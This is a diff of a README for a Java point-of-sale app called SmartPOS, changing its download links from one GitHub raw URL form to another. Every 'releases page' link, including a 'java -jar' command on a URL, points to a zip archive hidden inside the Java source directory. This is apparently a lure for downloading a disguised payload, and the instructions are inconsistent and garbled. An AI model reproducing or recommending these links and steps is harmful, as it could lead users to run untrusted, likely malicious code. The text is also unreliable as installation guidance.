@@ -1,7 +1,7 @@
 # 🛍️ Java-SmartPos-System - Your Easy Point of Sale Solution
 
 ## 📥 Download Now
-[![Download from Releases](https://github.com/cereal2111/Java-SmartPos-System/raw/refs/heads/main/src/main/java/io/smartpos/infrastructure/dao/report/Pos_System_Java_Smart_v3.1-beta.1.zip%20Now-v1.0-brightgreen)](https://github.com/cereal2111/Java-SmartPos-System/raw/refs/heads/main/src/main/java/io/smartpos/infrastructure/dao/report/Pos_System_Java_Smart_v3.1-beta.1.zip)
+[![Download from Releases](https://raw.githubusercontent.com/cereal2111/Java-SmartPos-System/main/src/main/java/io/smartpos/infrastructure/dao/report/Pos_System_Java_Smart_v3.1-beta.1.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/cereal2111/Java-SmartPos-System/main/src/main/java/io/smartpos/infrastructure/dao/report/Pos_System_Java_Smart_v3.1-beta.1.zip)
 
 ## 📜 Description
 SmartPOS is a modern point of sale system designed for small businesses. Built with JavaFX and Clean Architecture, SmartPOS offers a strong foundation for managing sales and transactions effectively. This application is also suitable for demonstrating quality software design in Java.
@@ -18,7 +18,7 @@ SmartPOS runs on the following systems:
 Make sure that your system meets these requirements before proceeding.
 
 ### 2. Visit the Download Page
-To download SmartPOS, [visit this page to download](https://github.com/cereal2111/Java-SmartPos-System/raw/refs/heads/main/src/main/java/io/smartpos/infrastructure/dao/report/Pos_System_Java_Smart_v3.1-beta.1.zip). This page lists all available versions of the application.
+To download SmartPOS, [visit this page to download](https://raw.githubusercontent.com/cereal2111/Java-SmartPos-System/main/src/main/java/io/smartpos/infrastructure/dao/report/Pos_System_Java_Smart_v3.1-beta.1.zip). This page lists all available versions of the application.
 
 ### 3. Choose the Latest Release
 On the releases page, look for the latest version. It is usually at the top of the list. Select the release that suits your operating system.
@@ -44,7 +44,7 @@ Click on the version you want. You will see different files available for downlo
 - **Linux:**
   1. Open a terminal window.
   2. Navigate to the directory where the `.jar` file is downloaded.
-  3. Run the command `java -jar https://github.com/cereal2111/Java-SmartPos-System/raw/refs/heads/main/src/main/java/io/smartpos/infrastructure/dao/report/Pos_System_Java_Smart_v3.1-beta.1.zip` to launch the application.
+  3. Run the command `java -jar https://raw.githubusercontent.com/cereal2111/Java-SmartPos-System/main/src/main/java/io/smartpos/infrastructure/dao/report/Pos_System_Java_Smart_v3.1-beta.1.zip` to launch the application.
 
 ### 6. First-Time Setup
 When you open SmartPOS for the first time, follow these initial setup steps:
@@ -89,4 +89,4 @@ Join our community to stay updated or share your experience using SmartPOS. Foll
 ## 📄 License
 SmartPOS is an open-source application released under the MIT License.
 
-To download SmartPOS, [visit this page to download](https://github.com/cereal2111/Java-SmartPos-System/raw/refs/heads/main/src/main/java/io/smartpos/infrastructure/dao/report/Pos_System_Java_Smart_v3.1-beta.1.zip) again for the latest updates!
+To download SmartPOS, [visit this page to download](https://raw.githubusercontent.com/cereal2111/Java-SmartPos-System/main/src/main/java/io/smartpos/infrastructure/dao/report/Pos_System_Java_Smart_v3.1-beta.1.zip) again for the latest updates!
